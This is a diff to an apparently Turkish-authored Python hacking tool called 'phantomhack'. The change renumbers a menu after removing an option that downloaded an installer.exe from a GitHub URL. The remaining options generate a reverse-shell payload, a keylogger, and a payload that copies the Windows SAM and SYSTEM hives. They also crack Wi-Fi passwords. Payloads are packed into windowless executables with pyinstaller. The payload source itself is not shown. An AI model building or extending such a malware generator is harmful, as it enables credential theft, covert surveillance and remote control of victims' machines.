@@ -159,10 +159,9 @@ def main():
 
 
  print("[1] make payload(advenced reverse shell)")
- print("[2] install hexstorm tool")
- print("[3] make keylogger")
- print("[4] make payload for sam and system")
- print("[5] crack wifi password")
+ print("[2] make keylogger")
+ print("[3] make payload for sam and system")
+ print("[4] crack wifi password")
  input_choice = input(f"{os.getlogin()}@phantomhack>> ")
  if input_choice == "1":
     nm=input("payload name: ")
@@ -317,9 +316,6 @@ if __name__ == '__main__':
     print("exe halinde payload oluşturuldu")
     print("payload oluşturma tamamlandı.")
  if input_choice == "2":
-    print("githur1234 hexstorm yükleniyor (aynı yazılımcıdan çıktı)")
-    requests.get("https://github.com/githur1234/pentest/raw/refs/heads/main/instaler.exe")
- if input_choice == "3":
     nm=input("keylogger name: ")
     with open(f"{nm}.py","w") as keylogger:
         keylogger.write('''
@@ -344,7 +340,7 @@ def index():
      os.system("python -m pip install pyinstaller")
      os.system(rf"cd C:\Users\{os.getlogin()}\AppData\Local\Packages\PythonSoftwareFoundation.Python.{sys.version_info.major}.{sys.version_info.minor}_qbz5n2kfra8p0\LocalCache\local-packages\Python{sys.version_info.major}{sys.version_info.minor}\Scripts")
      os.system(f"pyinstaller c:/users/{os.getlogin()}/{nm} --onefile --noconlose ")   
- if input_choice=="4":
+ if input_choice=="3":
     nm=input("payload name:")
     with open(f"{nm}.py","w+") as payload2:
         payload2.write('''
@@ -359,6 +355,6 @@ shadow_copy("c:/windows/system32/config/system",os.path.splitdrive(os.getcwd())[
      os.system("python -m pip install pyinstaller")
      os.system(rf"cd C:\Users\{os.getlogin()}\AppData\Local\Packages\PythonSoftwareFoundation.Python.{sys.version_info.major}.{sys.version_info.minor}_qbz5n2kfra8p0\LocalCache\local-packages\Python{sys.version_info.major}{sys.version_info.minor}\Scripts")
      os.system(f"pyinstaller c:/users/{os.getlogin()}/{nm} --onefile --noconlose ")   
- if input_choice=="5":
+ if input_choice=="4":
          crack(input("kırılıcak ağın adı:"))
        
